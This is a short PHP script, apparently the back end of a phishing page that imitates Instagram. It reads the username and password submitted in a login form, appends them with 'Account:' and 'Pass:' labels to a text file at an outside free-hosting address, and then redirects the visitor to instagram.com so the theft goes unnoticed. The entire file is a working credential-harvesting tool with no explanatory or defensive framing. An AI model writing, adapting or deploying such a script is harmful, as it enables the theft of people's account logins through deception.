<?php

file_put_contents("https://mrstarkstore.000webhostapp.com/username.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://instagram.com');
exit();
